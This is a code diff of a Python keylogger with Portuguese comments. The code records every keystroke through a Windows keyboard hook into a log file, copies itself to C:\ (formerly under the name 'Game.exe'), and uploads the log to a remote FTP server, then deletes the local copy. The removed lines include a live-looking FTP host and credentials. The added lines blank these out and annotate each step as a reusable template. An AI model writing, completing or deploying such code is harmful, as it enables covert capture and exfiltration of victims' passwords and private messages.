@@ -5,42 +5,42 @@ import pyHook
 import shutil
 
 
-def copy():
+def copy(): # Copia o Keylogger para C:\\
      try:
           files = ("C:\\")
-          shutil.copy('Game.exe', files)
+          shutil.copy('Nome do keylogger', files)
      except Exception as e:
-           print('Tipo de erro 1:', type(e))
+          print('Tipo de erro 1:', type(e))  # Apresenta o nome de erros para correções
             
            
-def ftp():
+def ftp(): #Função para Upar o 
      try:
-          files = ("system_logs.txt")
-          user = "min3r"
-          passw = "mr.robotd23"
-          ftp = ftplib.FTP("files.000webhost.com")
+          files = ("system_logs.txt") #Upa este arquivo para o servidor FTP
+          user = "" #User do FTP
+          passw = "" #Pass do FTP
+          ftp = ftplib.FTP("") #Server do FTP
           ftp.login(user, passw) 
           file = open(files, "rb") 
-          ftp.cwd('/')
+          ftp.cwd('/') #Diretório Onde o arquivo vai ser armazenado no servidor FTP
           ftp.storbinary('STOR ' + files, file) 
           print ("STORing File now...") 
           ftp.quit() 
           file.close() 
           os.remove(files)
      except Exception as e:
-           print('Tipo de erro 2: ', type(e))
+           print('Tipo de erro 2: ', type(e))  # Apresenta o nome de erros para correções
      
 copy()
 ftp()
 
-def keyevent(event):
+def keyevent(event): # Inicia o evento para gravar as teclas, o programa não filtra nenhuma tecla, cabe ao usuario corrigir os erros :)
      try:
-          files = ("C:\\system_logs.txt")
+          files = ("C:\\system_logs.txt") #Escreve o que foi gravado no system_logs.txt no diretório C:\\
           fp = open(files, "a")
           fp.write(("\n"+event.Key))
           fp.close()
      except Exception as e:
-          print('Tipo de erro 3: ', type(e))
+          print('Tipo de erro 3: ', type(e))   # Apresenta o nome de erros para correções
           return True
      
 
@@ -50,3 +50,4 @@ obg.HookKeyboard()
 
 pythoncom.PumpMessages()
 
+#BY C4L4NG0_M4T4D0R
